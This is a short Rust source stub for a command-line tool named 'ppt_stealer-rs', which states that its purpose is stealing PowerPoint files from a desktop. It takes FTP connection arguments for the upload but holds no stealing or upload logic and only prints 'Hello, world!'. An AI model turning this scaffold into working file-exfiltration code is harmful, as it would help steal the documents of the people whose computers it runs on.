use clap::{Parser, ArgGroup};

#[derive(Parser)]
#[command(name = "ppt_stealer-rs", version = "0.1")]
#[command(about = "A tool to steal PowerPoint files from desktop", long_about = None)]
#[command(group(
    ArgGroup::new("auth")
        .args(&["password", "key_auth"])
        .required(true)
        .multiple(false)
))]
struct Cli {
    #[arg(short = 'i', long)]
    ftp_ip: String,

    #[arg(short = 'p', long)]
    ftp_port: i64,

    #[arg(short = 'u', long)]
    username: String,

    #[arg(short = 'P', long, group = "auth")]
    password: String,

    #[arg(long, default_value_t = false, group = "auth")]
    key_auth: bool,
}


fn main() {
    
    // Parse command line arguments
    let args = Cli::parse();

    // check arguments
    // check if ftp_ip and ftp_port are valid
    

    println!("Hello, world!");
}
